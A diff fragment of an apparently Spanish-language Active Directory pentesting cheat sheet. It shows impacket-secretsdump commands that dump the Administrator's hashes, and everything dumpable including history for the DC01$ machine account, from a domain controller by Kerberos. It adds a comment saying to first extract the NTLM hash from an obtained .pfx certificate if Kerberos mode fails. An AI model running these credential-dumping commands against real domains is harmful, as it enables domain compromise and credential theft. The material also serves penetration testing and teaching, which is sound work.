@@ -156,7 +156,9 @@ impacket-secretsdump -k -no-pass -dc-ip 10.10.10.10 -just-dc-user Administrator 
 # Ejemplo para tratar de volcar todo lo posible
 impacket-secretsdump -k -no-pass -history -dc-ip 10.10.10.10 'CORP.LOCAL/DC01$'@DC01.CORP.LOCAL
 
-##
+### SI EL MODO -K NO FUNCIONA
+### EXTRAEMOS PRIMERO CON EL .PFX OBTENIDO, EL NTLM HASH (EXPLICADO MAS ARRIBA) Y LUEGO EJECUTAMOS
+ 
 ```
 
 ### Caso 4: Cuenta de Máquina Estándar (`WORKSTATION$` o `SERVER$`)
